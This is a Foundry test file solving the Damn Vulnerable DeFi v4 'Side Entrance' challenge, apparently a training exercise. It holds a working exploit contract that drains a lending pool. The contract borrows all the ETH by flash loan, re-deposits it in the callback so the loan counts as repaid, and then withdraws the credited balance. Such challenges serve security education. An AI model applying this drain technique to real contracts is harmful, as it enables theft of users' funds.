// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * =========================================================
     * SOLUTION — test_sideEntrance()
     * =========================================================
     * Attack: Flash loan repayment via deposit() (balance check bypass)
     * 1. Flash loan all 1000 ETH from pool
     * 2. execute() deposits borrowed ETH back into pool
     *    → pool.balance unchanged, loan "repaid" via deposit credit
     * 3. withdraw() pulls ETH out using our deposit balance
     * 4. Transfer all ETH to recovery
     * =========================================================
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // Deploy exploit contract with pool and recovery addresses
        SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);
        // Trigger the attack with a flash loan of all ETH in the pool
        exploit.attack{value: 0}(ETHER_IN_POOL);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}


/**
 * =========================================================
 * SOLUTION CONTRACT — SideEntranceExploit
 * =========================================================
 * Attack: Flash loan repayment via deposit() balance bypass
 * 1. Receives flash loan via execute() callback
 * 2. Deposits borrowed ETH back — pool balance check passes
 * 3. Credits our balance so we can withdraw after the loan
 * 4. Sends all ETH to recovery on withdraw
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice Exploit contract for SideEntranceLenderPool
 * @dev Implements IFlashLoanEtherReceiver — pool calls execute()
 *      during the loan. Re-deposits borrowed ETH to satisfy the
 *      balance invariant while building a withdrawable credit.
 */
contract SideEntranceExploit {
    SideEntranceLenderPool public pool;
    address public recovery;

    /**
     * @notice Initializes the exploit with target pool and recovery address
     * @param _pool Address of the vulnerable lending pool
     * @param _recovery Address to send stolen ETH to
     */
    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    /**
     * @notice Executes the full attack in one transaction
     * @dev Requests flash loan, which triggers execute(), enabling deposit
     *      Then withdraws all deposited ETH and sends to recovery
     * @param amount Amount of ETH to borrow via flash loan
     */
    function attack(uint256 amount) external payable {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }

    /**
     * @notice Callback required by flash loan interface
     * @dev Called by pool during flashLoan; deposits borrowed ETH into pool
     *      This increases our balance in pool's accounting without spending own funds
     */
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    /**
     * @notice Allows contract to receive ETH
     * @dev Required to receive funds from pool during withdrawal
     */
    receive() external payable {}
}
